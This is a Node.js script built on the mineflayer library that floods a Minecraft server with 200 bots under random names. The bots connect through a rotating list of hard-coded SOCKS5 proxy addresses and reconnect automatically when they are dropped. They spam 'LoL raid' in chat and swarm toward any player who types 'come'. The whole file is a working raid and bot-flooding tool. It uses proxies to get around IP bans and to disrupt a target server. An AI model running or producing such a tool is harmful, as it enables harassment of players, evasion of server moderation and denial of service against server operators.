const mineflayer = require('mineflayer');
const socks = require('socks').SocksClient;
const pathfinder = require('mineflayer-pathfinder').pathfinder
const Movements = require('mineflayer-pathfinder').Movements
const { GoalNear } = require('mineflayer-pathfinder').goals
var tpsPlugin = require('mineflayer-tps')(mineflayer)



function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


async function sendMessages(bot, message, count) {
    for (let n = 0; n < count; n++) {
        bot.chat(message);
        await sleep(1000); 
    }
}


function createBot(options, message, count) {
    const bot = mineflayer.createBot(options);
    bot.loadPlugin(pathfinder)
    bot.loadPlugin(tpsPlugin)
    bot.once('spawn', () => {


    
        const defaultMove = new Movements(bot)
        bot.on('chat', function(username, message) {
          if (username === bot.username) return
      
          const target = bot.players[username] ? bot.players[username].entity : null
          if (message === 'come') {
            sendMessages(bot, "LoL raid", 10);
            if (target){
                const p = target.position
      
                bot.pathfinder.setMovements(defaultMove)
                bot.pathfinder.setGoal(new GoalNear(p.x, p.y, p.z, 1))
                
                console.log(bot.getTps())
            }
               
      
          } 
        })
      })
      
    

    bot.on('error', (err) => {
        console.log(`Error with ${options.username}: ${err}`);
    });

    bot.on('end', async () => {
        console.log(`Bot ${options.username} disconnected. Reconnecting in 5 seconds...`);
        await sleep(5000);
        
        createBot(options, message, count); 
    });
}



function generateRandomUsername(prep) {
    const randomNumber = Math.floor(Math.random() * 9999);
    return `${prep}${randomNumber}`;
}

function createBotWithProxy(options, proxy) {
    const botOptions = {
        ...options,
        connect: (client) => {
            socks.createConnection({
                proxy: {
                    host: proxy.host,
                    port: proxy.port,
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: options.host,
                    port: options.port
                }
            }, (err, info) => {
                if (err) {
                    console.log(`Proxy connection error for ${options.username}: ${err.message}`);
                    return;
                }
                client.setSocket(info.socket);
                client.emit('connect');
            });
        }
    };
    createBot(botOptions, 'raid by wave', 15); // Use the bot options and proxy
}

// List of proxies
const proxyList = [
    { host: '174.77.111.196', port: 4145 },
    { host: '184.178.172.13', port: 15311 }
];



async function createMultipleBotsWithProxy(numberOfBots, host, port,prep) {
    for (let i = 0; i < numberOfBots; i++) {
        const username = generateRandomUsername(prep);
        const proxy = proxyList[i % proxyList.length];
        const botOptions = {
            host: host,
            port: port,
            username: username,
            version: 1.15,
        };
        createBotWithProxy(botOptions, proxy);
        await sleep(500);
    }
}

// Launch multiple bots
try {
    createMultipleBotsWithProxy(200, '000.000.000.00', 25565, "bot");//prefix
}
catch(err) {
  console.log("Error ")
}

